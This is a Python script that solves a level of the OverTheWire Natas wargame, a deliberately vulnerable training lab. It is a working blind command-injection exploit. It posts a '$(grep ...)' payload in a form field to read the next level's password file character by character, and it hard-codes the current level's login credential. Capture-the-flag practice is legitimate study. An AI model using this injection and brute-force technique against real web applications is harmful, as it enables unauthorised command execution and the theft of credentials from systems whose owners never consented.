#! /usr/bin/python
from bs4 import BeautifulSoup
import requests

url = 'http://natas16.natas.labs.overthewire.org'
auth=('natas16','WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')

characters = [chr(x) for x in range(48,58)]+[chr(x) for x in range(65,91)]+[chr(x) for x in range(97,123)]
shell_inj = "$(grep ^{} /etc/natas_webpass/natas17)flinching"
miss = '\nflinching\n'

def linear_search(password):
  for c in characters:
    print(c, end=' ', flush=True)
    res = requests.post(url,auth=auth,data={'needle':shell_inj.format(password+c)})
    while res.status_code >= 500:
      print(f'Server Error: {res.status_code}', flush=True)
      res = requests.post(url,auth=auth,data={'needle':shell_inj.format(password+c)})
    if res.status_code >= 300:
      print(f'Error Code: {res.status_code}', flush=True)
      exit()
    if res.status_code >= 200:
      if BeautifulSoup(res.text, 'lxml').find('pre').contents[0] != miss:
        return password+c
  print()
  exit()

password = ''
for i in range(32):
  for j in range(32):
    if j < len(password):
      print(password[j], end='')
    else:
      print('.', end='')
  print()
  print('{})'.format(f'{i}'.zfill(2)), end=' ')
  password = linear_search(password)
  print()
print(password)
